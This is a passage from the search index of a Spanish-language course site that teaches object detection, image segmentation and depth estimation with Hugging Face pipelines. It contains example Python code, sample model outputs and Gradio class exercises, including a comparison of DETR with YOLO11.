deportes, b\u00fasqueda de im\u00e1genes y conteo de objetos en diferentes escenarios. </p> <p>Hugging Face alberga varios modelos que han sido entrenados previamente para detectar objetos en im\u00e1genes. Podemos ver una lista de modelos en https://huggingface.co/models?pipeline_tag=object-detection&amp;sort=trending </p> <p>En la figura siguiente podemos visualizar un listado de la categor\u00eda Object Detection:</p> <p></p> <p>Ejemplo de uso del modelo facebook/detr-resnet-50 para la detecci\u00f3n de objetos:</p> <p></p> <p>Podemos probar el modelo directamente utilizando la API de inferencia alojada en Hugging Face. Para ello, usaremos una imagen de una oficina con algunas mujeres: </p> <p>Fuente: https://en.wikipedia.org/wiki/Office#/media/File:Good_Smile_Company_offices_ladies.jpg </p> <p>Al arrastrar y soltar la imagen en la secci\u00f3n \"Inference API\" alojada en la p\u00e1gina del modelo en Hugging Face, veremos la lista de objetos detectados, as\u00ed como sus probabilidades correspondientes: </p> <p>Al pasar el rat\u00f3n por encima del nombre de un objeto detectado, la imagen resalta el cuadro delimitador del objeto seleccionado.</p>"},{"location":"hf/Tasks_vc/#algunos-modelos-disponibles-en-hugging-face","title":"Algunos modelos disponibles en Hugging Face","text":"<p>Hugging Face ofrece modelos preentrenados que permiten realizar detecci\u00f3n de objetos sin necesidad de entrenamiento adicional.</p> Modelo Arquitectura Dataset Enlace <code>facebook/detr-resnet-50</code> DETR (DEtection TRansformer) COCO \ud83d\udd17 Ver modelo <code>hustvl/yolos-small</code> YOLOS (Vision Transformer) COCO \ud83d\udd17 Ver modelo"},{"location":"hf/Tasks_vc/#principales-aplicaciones","title":"Principales Aplicaciones","text":"<ul> <li>Conducci\u00f3n aut\u00f3noma: Los coches sin conductor usan la detecci\u00f3n de objetos para reconocer peatones, bicicletas, sem\u00e1foros y se\u00f1ales de tr\u00e1fico, ayudando a la toma de decisiones en tiempo real.</li> <li>Seguimiento en deportes: En partidos de f\u00fatbol o tenis se rastrea el bal\u00f3n o los jugadores para mejorar el arbitraje y el an\u00e1lisis estad\u00edstico.</li> <li>B\u00fasqueda de im\u00e1genes: Los tel\u00e9fonos inteligentes permiten buscar lugares u objetos directamente en internet mediante la detecci\u00f3n de entidades en fotos.</li> <li>Conteo de objetos: La detecci\u00f3n ayuda a contar existencias en almacenes, tiendas, o personas en eventos.</li> </ul>"},{"location":"hf/Tasks_vc/#metricas-de-evaluacion","title":"M\u00e9tricas de Evaluaci\u00f3n","text":"<ul> <li>Precisi\u00f3n media promedio (AP): \u00c1rea bajo la curva de precisi\u00f3n versus recall para cada clase.</li> <li>mAP (mean Average Precision): Promedio de AP en todas las clases.</li> <li>AP\u03b1: Precisi\u00f3n promedio seg\u00fan el umbral de IoU (por ejemplo, AP50 muestra AP cuando el IoU es &gt;0,5).</li> </ul>"},{"location":"hf/Tasks_vc/#ejemplo-de-uso-con-gradio","title":"Ejemplo de uso con Gradio","text":"<p>Vamos a crear una aplicaci\u00f3n web con Gradio que use un objeto pipeline del modelo <code>facebook/detr-resnet-50</code>.</p> <p>As\u00ed es como se carga:  <pre><code>from transformers import pipeline\n\ndetection = pipeline(\"object-detection\", model=\"facebook/detr-resnet-50\")\n</code></pre> Una vez que hayamos creado el objeto tipo pipeline (detecci\u00f3n en este caso), podemos pasar directamente la imagen (en formato PIL) al pipeline y obtener el resultado: </p> <p><pre><code>results = detection(image)\nresults\n</code></pre> Debemos tener en cuenta que el objeto de tipo pipeline (detecci\u00f3n) tambi\u00e9n puede incluir una URL de una imagen, no solo un objeto de imagen tipo PIL. Es decir, tambi\u00e9n podemos llamar al objeto pipeline de la siguiente manera: </p> <p><pre><code>results = detection('http://bit.ly/46xv3sL')\n</code></pre> <pre><code># Si no funcionara, prueba a descargar el fichero y ejecutarlo de forma local:\nresults = detection('Good_Smile_Company_offices_ladies.jpg')\n</code></pre> Debemos instalar la librer\u00eda <code>timm</code> (PyTorch Image Models) para Python. Es una extensa colecci\u00f3n de modelos de visi\u00f3n por computadora de \u00faltima generaci\u00f3n (SOTA, por sus siglas en ingl\u00e9s). Est\u00e1 dise\u00f1ada para ser utilizada con el framework PyTorch y es muy apreciada en la comunidad de aprendizaje profundo por su flexibilidad y la gran cantidad de modelos preentrenados que ofrece. <pre><code>pip install timm\n</code></pre> El resultado impreso se ver\u00eda as\u00ed: <pre><code>[{'score': 0.9179903864860535,\n  'label': 'person',\n  'box': {'xmin': 549, 'ymin': 145, 'xmax': 564, 'ymax': 165}},\n {'score': 0.9960624575614929,\n  'label': 'tv',\n  'box': {'xmin': 317, 'ymin': 212, 'xmax': 416, 'ymax': 299}},\n {'score': 0.9425505995750427,\n  'label': 'chair',\n  'box': {'xmin': 508, 'ymin': 306, 'xmax': 661, 'ymax': 429}},\n {'score': 0.9753392338752747,\n  'label': 'person',\n  'box': {'xmin': 673, 'ymin': 135, 'xmax': 705, 'ymax': 174}},\n {'score': 0.962176501750946,\n  'label': 'person',\n  'box': {'xmin': 703, 'ymin': 115, 'xmax': 722, 'ymax': 140}},\n {'score': 0.9881888628005981,\n  'label': 'person',\n  'box': {'xmin': 454, 'ymin': 142, 'xmax': 497, 'ymax': 202}},\n {'score': 0.9871691465377808,\n  'label': 'keyboard',\n  'box': {'xmin': 344, 'ymin': 276, 'xmax': 445, 'ymax': 346}},\n {'score': 0.9371852874755859,\n  'label': 'tv',\n  'box': {'xmin': 309, 'ymin': 194, 'xmax': 374, 'ymax': 237}},\n {'score': 0.9975801706314087,\n  'label': 'person',\n  'box': {'xmin': 395, 'ymin': 152, 'xmax': 446, 'ymax': 216}},\n {'score': 0.9986708164215088,\n  'label': 'person',\n  'box': {'xmin': 237, 'ymin': 174, 'xmax': 308, 'ymax': 264}},\n {'score': 0.9173707365989685,\n  'label': 'person',\n  'box': {'xmin': 720, 'ymin': 112, 'xmax': 737, 'ymax': 131}},\n {'score': 0.9895991086959839,\n  'label': 'potted plant',\n  'box': {'xmin': 124, 'ymin': 211, 'xmax': 230, 'ymax': 330}},\n {'score': 0.9996592998504639,\n  'label': 'person',\n  'box': {'xmin': 369, 'ymin': 226, 'xmax': 535, 'ymax': 427}},\n {'score': 0.9821581840515137,\n  'label': 'tv',\n  'box': {'xmin': 491, 'ymin': 181, 'xmax': 530, 'ymax': 223}},\n {'score': 0.9970135688781738,\n  'label': 'person',\n  'box': {'xmin': 516, 'ymin': 177, 'xmax': 628, 'ymax': 318}}]\n</code></pre> El resultado es una lista de diccionarios para cada objeto detectado. Para dibujar la etiqueta y el cuadro delimitador de cada objeto, utilizaremos el siguiente fragmento de c\u00f3digo: </p> <p><pre><code>import random\nfrom PIL import Image, ImageDraw\nimport requests\nimport torch\n\ndraw = ImageDraw.Draw(image)\n\nfor object in results:\n    box = [i for i in object['box'].values()]\n    print(\n        f\"Detected {object['label']} with confidence \"\n        f\"{(object['score'] * 100):.2f}% at {box}\"\n    )\n\n    r = random.randint(0, 255)\n    g = random.randint(0, 255)\n    b = random.randint(0, 255)\n    color = (r, g, b)\n\n    draw.rectangle(box,\n                   outline=color,\n                   width=2)\n\n    draw.text((box[0], box[1]-10),\n              object['label'],\n              fill='white')\n\ndisplay(image)\n</code></pre> La imagen ser\u00eda id\u00e9ntica a la que se muestra anteriormente pero con los cuadrados correspondientes. Con el objeto pipeline, tambi\u00e9n podemos obtener una lista de etiquetas directamente mediante el atributo <code>model.config.id2label</code>:  <pre><code>detection.model.config.id2label\n</code></pre></p>"},{"location":"hf/Tasks_vc/#actividad-guiada","title":"Actividad guiada","text":"<p>Desarrollar con Gradio un template similar es este:   Resultado final: </p> <p>Define:</p> <ul> <li>Una funci\u00f3n llamada predict</li> <li>Interface Gradio que env\u00ede una imagen y muestre la imagen con los objetos detectados</li> </ul> <p>C\u00f3digo final en Gradio: <pre><code>import gradio as gr\nfrom PIL import Image, ImageDraw\nfrom transformers import pipeline\nimport random \n\ndef predict(image):    \n\n    detection = pipeline(\"object-detection\", model=\"facebook/detr-resnet-50\")\n\n    results = detection(image)       \n\n    draw = ImageDraw.Draw(image) \n\n    for object in results: \n        box = [i for i in object['box'].values()] \n        print( \n            f\"Detected {object['label']} with confidence \"   \n            f\"{(object['score'] * 100):.2f}% at {box}\"   \n        ) \n\n        r = random.randint(0, 255) \n        g = random.randint(0, 255) \n        b = random.randint(0, 255) \n        color = (r, g, b) \n\n        #Dibuja un cuadro delimitador alrededor del objeto.\n        draw.rectangle(box,  \n                    outline=color,  \n                    width=2)  \n        #Muestra la etiqueta del objeto\n        draw.text((box[0], box[1]-10),  \n                object['label'],  \n                fill='white')  \n\n    return image\n\n\ndemo = gr.Interface(\n    predict, \n    inputs=gr.Image(type=\"pil\"), \n    outputs=\"image\")\n\ndemo.launch()\n</code></pre></p>"},{"location":"hf/Tasks_vc/#actividad-2-comparativa-practica-de-deteccion-de-objetos-con-hugging-face-y-ultralytics-yolo11","title":"\ud83d\udcdd Actividad 2: Comparativa pr\u00e1ctica de Detecci\u00f3n de Objetos con Hugging Face y Ultralytics YOLO11","text":""},{"location":"hf/Tasks_vc/#contexto","title":"Contexto","text":"<p>Hemos trabajado en clase con modelos de detecci\u00f3n de objetos, usando ejemplos como <code>facebook/detr-resnet-50</code>  en Hugging Face (ver ejemplo y recursos de clase). En esta actividad, ir\u00e1s un paso m\u00e1s all\u00e1 probando la herramienta Ultralytics YOLO11, consultando su documentaci\u00f3n oficial de integraci\u00f3n con Gradio.</p>"},{"location":"hf/Tasks_vc/#objetivos_1","title":"Objetivos","text":"<ul> <li>Investigar y comprender el funcionamiento de la familia YOLO (en especial YOLO11).</li> <li>Probar distintos c\u00f3digos y ejemplos reales usando YOLO11 y Gradio.</li> <li>Comparar los resultados con los de <code>facebook/detr-resnet-50</code> en velocidad, facilidad de uso y precisi\u00f3n.</li> <li>Reflexionar sobre ventajas e inconvenientes de cada enfoque en distintos escenarios reales.</li> </ul>"},{"location":"hf/Tasks_vc/#1-lectura-e-investigacion-inicial","title":"1. Lectura e investigaci\u00f3n inicial","text":"<ul> <li>Lee la documentaci\u00f3n de Ultralytics YOLO11 y familiar\u00edzate con su API y flujo de trabajo.</li> <li>Consulta y ejecuta el ejemplo de integraci\u00f3n con Gradio: docs oficiales.</li> </ul>"},{"location":"hf/Tasks_vc/#2-implementacion-y-pruebas","title":"2. Implementaci\u00f3n y pruebas","text":"<ul> <li>Ejecuta la demo b\u00e1sica de YOLO11+Gradio incluida en la documentaci\u00f3n.</li> <li>Realiza anotaciones sobre el input, formato de resultados y velocidad tras varias ejecuciones con im\u00e1genes reales o ejemplos propios.</li> </ul>"},{"location":"hf/Tasks_vc/#3-comparativa-objetiva-con-hugging-face","title":"3. Comparativa objetiva con Hugging Face","text":"<ul> <li>Utiliza el modelo <code>facebook/detr-resnet-50</code> desde Hugging Face (ya visto en clase) para detectar objetos en al menos dos im\u00e1genes iguales a las usadas en YOLO11.</li> <li>Rellena la tabla comparativa:</li> </ul> Imagen Modelo Objetos detectados Tiempo de inferencia Falsos positivos/negativos Facilidad de integraci\u00f3n Observaciones (insertar nombre) YOLO11 (insertar nombre) detr-resnet-50 (HF) <ul> <li>Comenta los resultados en t\u00e9rminos de:<ul> <li>Exactitud y n\u00famero/calidad de predicciones.</li> <li>Consumo de recursos y tiempo de ejecuci\u00f3n (compara si es posible en CPU y GPU).</li> <li>Facilidad de uso/grado de documentaci\u00f3n o n\u00famero de l\u00edneas de c\u00f3digo para uso en Gradio.</li> </ul> </li> </ul>"},{"location":"hf/Tasks_vc/#entrega","title":"Entrega","text":"<ul> <li>Un archivo <code>.py</code> con el c\u00f3digo empleado y comentarios.</li> <li>Las im\u00e1genes o capturas de pantalla de las pruebas realizadas.</li> <li>Rellena y agrega la tabla comparativa.</li> </ul>"},{"location":"hf/Tasks_vc/#3-segmentacion-de-imagenes-image-segmentation","title":"3. Segmentaci\u00f3n de im\u00e1genes (Image segmentation)","text":"<p>La segmentaci\u00f3n de im\u00e1genes es una t\u00e9cnica de visi\u00f3n por computador que divide una imagen en segmentos o regiones, cada una correspondiente a un objeto de inter\u00e9s. Con la segmentaci\u00f3n de im\u00e1genes, podemos analizar una imagen y extraer informaci\u00f3n valiosa de ella. </p> <p></p> <p>Algunos de sus usos son: </p> <ul> <li>Im\u00e1genes m\u00e9dicas: se utilizan para identificar y segmentar tumores en resonancias magn\u00e9ticas o tomograf\u00edas computarizadas </li> <li>Detecci\u00f3n y reconocimiento de objetos: al igual que la detecci\u00f3n de objetos que hemos visto anteriormente, tambi\u00e9n podemos utilizar la segmentaci\u00f3n de im\u00e1genes para identificar y localizar objetos en una imagen </li> <li>Procesamiento de documentos: se utiliza para segmentar regiones de texto en documentos escaneados </li> <li>Biometr\u00eda: se utiliza para identificar y localizar rostros en im\u00e1genes o fotogramas de v\u00eddeo </li> </ul> <p>Hugging Face incluye varios modelos de segmentaci\u00f3n de im\u00e1genes que podemos usar. Uno de ellos es el modelo SegFormer \"SegFormer model fine-tuned on ADE20k\", optimizado con ADE20k.</p> <p>La siguiente imagen muestra el modelo SegFormer fine-tuned (optimizado) por el modelo ADE20k en la web de Hugging Face: </p> <p>Para probar el modelo de segmentaci\u00f3n, usaremos una imagen del Taj Mahal. La arrastraremos y la soltaremos en la secci\u00f3n de \"Hosted inference API\" alojada en la p\u00e1gina de Hugging Face:</p> <p>Imagen del Taj Mahal  Fuente: https://mng.bz/5vzD</p> <p>Resultado de la segmentaci\u00f3n de im\u00e1genes utilizando una imagen del Taj Mahal: </p> <p>Como podemos ver en el resultado, el modelo puede detectar diferentes objetos en la imagen (edificios, cielos, \u00e1rboles, etc\u00e9tera) y resaltar los diversos segmentos en dicha imagen. De hecho, podemos pasar el rat\u00f3n sobre las diversas etiquetas segmentadas y la imagen resaltar\u00e1 dicha etiqueta seleccionada. </p>"},{"location":"hf/Tasks_vc/#uso-del-modelo-con-pipeline","title":"Uso del modelo con pipeline","text":"<p>Como es habitual, usaremos el modelo mediante programaci\u00f3n. Primero, cargamos el modelo y luego verificamos cu\u00e1ntos objetos puede detectar el modelo. La forma m\u00e1s f\u00e1cil de usar el modelo es usar un pipeline  de la librer\u00eda <code>transformers</code>:  <pre><code>from transformers import pipeline \n\nsegmentation = pipeline(\"image-segmentation\",  \n               model=\"nvidia/segformer-b0-finetuned-ade-512-512\") \n\nprint(segmentation.model.config.id2label)\n</code></pre> Estos son los primeros y \u00faltimos cinco objetos que puede detectar (el modelo puede detectar un total de 150 objetos):  <pre><code>{0: 'wall', \n 1: 'building', \n 2: 'sky', \n 3: 'floor', \n 4: 'tree', \n ... \n 145: 'shower', \n 146: 'radiator', \n 147: 'glass', \n 148: 'clock', \n 149: 'flag'} \n</code></pre> Para este ejemplo, usaremos una imagen donde vemos a un hombre y a un avi\u00f3n que vuela por encima, para as\u00ed descubrir los distintos segmentos de dicha imagen: </p> <p> </p> <p>Fuente: https://unsplash.com/photos/EC_GhFRGTAY</p> <p>Para detectar los distintos segmentos de la imagen, pasamos la direcci\u00f3n URL de una imagen al objeto pipeline:  <pre><code>from transformers import pipeline \nfrom PIL import Image\nimport requests\n\nsegmentation = pipeline(\"image-segmentation\",  \n               model=\"nvidia/segformer-b0-finetuned-ade-512-512\") \n\nurl = 'https://bit.ly/46iDeJQ'\nresults = segmentation(url)\nprint(results)\n</code></pre> La salida de la variable results es una lista de diccionarios que contiene detalles de cada uno de los segmentos detectados en la imagen:  <pre><code>[{'score': None,\n  'label': 'wall',\n  'mask': &lt;PIL.Image.Image image mode=L size=1587x2381&gt;},\n {'score': None,\n  'label': 'building',\n  'mask': &lt;PIL.Image.Image image mode=L size=1587x2381&gt;},\n {'score': None,\n  'label': 'sky',\n  'mask': &lt;PIL.Image.Image image mode=L size=1587x2381&gt;},\n {'score': None,\n  'label': 'person',\n  'mask': &lt;PIL.Image.Image image mode=L size=1587x2381&gt;},\n {'score': None,\n  'label': 'airplane',\n  'mask': &lt;PIL.Image.Image image mode=L size=1587x2381&gt;}]\n</code></pre> En particular, el elemento mask contiene la m\u00e1scara del segmento detectado. Para ver cada una de las m\u00e1scaras detectadas, recorremos la variable results: </p> <p><pre><code>for result in results:\n    print(result['label'])\n    result['mask'].show()\n</code></pre> Por pantalla visualizamos las etiquetas encontradas: <pre><code>wall\nbuilding\nsky\nperson\nairplane\n</code></pre> La figura siguiente muestra las m\u00e1scaras detectadas para person (persona) y airplane (avi\u00f3n): </p> <p>La parte blanca de la m\u00e1scara representa la parte de la imagen que contiene el segmento de inter\u00e9s. Podemos aplicar la m\u00e1scara sobre la imagen original mediante el siguiente fragmento de c\u00f3digo: </p> <p><pre><code>image = Image.open(requests.get(url, stream=True).raw) \n\nfor result in results: \n    base_image = image.copy() \n    mask_image = result['mask'] \n\n    # Aplica la m\u00e1scara sobre la imagen original\n    base_image.paste(mask_image, mask=mask_image) \n    #Imprime la etiqueta del segmento\n    print(result['label']) \n    result['mask'].show()\n</code></pre> La figura siguiente muestra las m\u00e1scaras de person (persona) y airplane (avi\u00f3n) aplicadas sobre la imagen original: </p> <p>Cuando aplicamos la m\u00e1scara sobre la imagen, observaremos que el segmento de inter\u00e9s est\u00e1 en blanco. Ser\u00eda m\u00e1s natural invertir esto, es decir, el segmento de inter\u00e9s deber\u00eda mostrarse mientras que el resto deber\u00eda estar en blanco. Para hacer esto, podemos invertir la m\u00e1scara usando la funci\u00f3n <code>invert()</code> de la clase <code>ImageOps</code> en el paquete <code>PIL</code>. Los siguientes cambios invierten la m\u00e1scara y, a continuaci\u00f3n, la aplican sobre la imagen original: </p> <p><pre><code>from PIL import ImageOps \n\nfor result in results: \n    base_image = image.copy() \n    mask_image = result['mask'] \n\n    mask_image = ImageOps.invert(mask_image)  #Invierte la m\u00e1scara \n    base_image.paste(mask_image, mask=mask_image)  #Aplica la m\u00e1scara sobre la imagen original \n    print(result['label'])  #Imprime la etiqueta del segmento\n    display(base_image) \n</code></pre> La figura siguiente muestra las m\u00e1scaras invertidas para person (persona) y airplane (avi\u00f3n)aplicadas en la imagen original. </p> <p></p>"},{"location":"hf/Tasks_vc/#actividad-3-gradio-para-segmentacion-de-imagenes","title":"\ud83d\udcdd Actividad 3: Gradio para segmentaci\u00f3n de im\u00e1genes","text":"<p>Crea un prototipo mediante Gradio haciendo uso de la clase Interface que te permita probar el modelo de segmentaci\u00f3n bas\u00e1ndote en el siguiente prototipo:  </p> <p>Pasamos una foto y en el campo Label especificamos el objeto a buscar, por ejemplo, person:  </p> <p>Resultados:  Detecci\u00f3n de person </p> <p>Detecci\u00f3n de airplane  Pasos:  </p> <ul> <li>Definir la interfaz de Gradio con los componentes de entrada y de salida similares al prototipo de la imagen </li> <li>Crea una funci\u00f3n \u201csegmentation\u201d que reciba los par\u00e1metros de entrada correspondientes. Dentro de dicha funci\u00f3n </li> <li>Cuando el modelo devuelva el resultado, iterar\u00e1 a trav\u00e9s del resultado y buscar\u00e1 la etiqueta especificada por el usuario (en el par\u00e1metro label). </li> <li>A continuaci\u00f3n, la funci\u00f3n invierte la m\u00e1scara correspondiente, la aplica a la imagen y la devuelve autom\u00e1ticamente.  <p>NOTA: Dentro de la funci\u00f3n deber\u00edas de imprimir los labels que te devuelve el modelo para saber   </p> </li> </ul> <p>Realiza algunas pruebas con im\u00e1genes diferentes y adjunta en este documento los resultados. </p> <p>Entrega el fichero py y las im\u00e1genes que hayas utilizado. </p>"},{"location":"hf/Tasks_vc_profundidad/","title":"POR HACER","text":""},{"location":"hf/Tasks_vc_profundidad/#4-estimacion-de-profundidad-depth-estimation","title":"4. Estimaci\u00f3n de Profundidad (Depth Estimation)","text":"<ul> <li>Definici\u00f3n: Predice la distancia de cada p\u00edxel respecto a la c\u00e1mara usando solo una imagen.</li> <li>Aplicaciones: Rob\u00f3tica, realidad aumentada, veh\u00edculos aut\u00f3nomos, etc.</li> <li>Modelos populares: DPT, MiDaS</li> </ul> <pre><code># Utiliza el pipeline:\n\nfrom transformers import pipeline\n\ndepth = pipeline(\"depth-estimation\", model=\"Intel/zoedepth-nyu-kitti\")\n\nresult = depth(\"ruta_o_url_imagen\")\n</code></pre>"}]}